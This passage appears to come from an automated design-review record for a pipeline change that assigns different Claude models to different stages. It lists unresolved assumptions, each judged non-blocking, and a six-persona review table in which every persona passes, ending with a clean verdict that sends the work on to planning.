  `claude-opus-4-7[1m]` (existing test fixture proves the metrics
  schema accepts bracketed forms) ✓

Outstanding assumed items in §9:

- `claude -p --model <id>` CLI form — high-confidence (documented per
  the standard claude.ai reference) but explicitly TODO to smoke-test
  pre-merge. NOT a P0 because the failure mode is graceful: if the
  CLI rejects the flag, dispatch.sh exits non-zero and run-stage.sh's
  classify-failure path handles it as a normal dispatch failure.
  Telemetry catches silent ignores via `usage-<stage>.json::model`.
- Specific model identifier strings (`claude-haiku-4-5-20251001`) —
  date-suffix could shift. TODO to confirm at plan time. NOT a P0
  because a wrong identifier produces a clear claude-side error on
  the first invocation, fixed by one config line.
- Sonnet 4.6 implement-stage quality post-ENG-101 — assumed by the
  issue's blocked-by clause. Post-merge spot-check measures
  scope-violation rate; revert mechanism is single-config-line.
- `_count_loopback_rejections_for_stage` parsing via
  `parse_pipeline_marker` — captured in §9 as the recommended
  implementation; not a structural blocker.

No P0 findings. Every code-level reference resolves to a real line in
the current tree, every named function/file/registry entry exists,
and the proposed edits are local additions to existing
case/resolution-chain patterns, not structural rewrites.

### Iteration 1 verdict

| Persona | Verdict | P0 | P1 |
|---|---|---|---|
| design | PASS | 0 | 0 |
| security | PASS | 0 | 0 |
| scope | PASS | 0 | 0 |
| coherence | PASS | 0 | 0 |
| product | PASS | 0 | 0 |
| feasibility (gating) | PASS | 0 | 0 |

**6/6 PASS · gate P0: 0** — gate cleared on iteration 1. No iteration
2 needed.

### Final verdict

`status = clean` — proceeding to planning. The brainstorm proposes
eight composable changes (D-001 default table, D-002 escalation
predicate, D-003 env-var hand-off, D-004 telemetry-as-truth, D-005
scope fence, D-006 test surface, D-007 CLAUDE.md doc, D-008
ENG-101-precondition ordering) bounded by the seven ACs in the Linear
issue's Mechanism § plus the issue's "Blocked by" clause, with
explicit ENG-101-precondition gating on the implementing-default
cutover and no overturned ADRs.
